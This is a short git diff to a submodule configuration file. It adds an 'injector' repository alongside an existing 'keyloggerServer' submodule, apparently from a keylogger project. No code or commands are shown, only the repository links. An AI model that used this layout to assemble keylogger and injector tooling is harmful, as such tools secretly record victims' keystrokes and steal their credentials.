@@ -1,3 +1,6 @@
 [submodule "servers"]
 	path = servers
 	url = https://github.com/x03xd/keyloggerServer.git
+[submodule "injector"]
+	path = injector
+	url = https://github.com/x03xd/injector.git
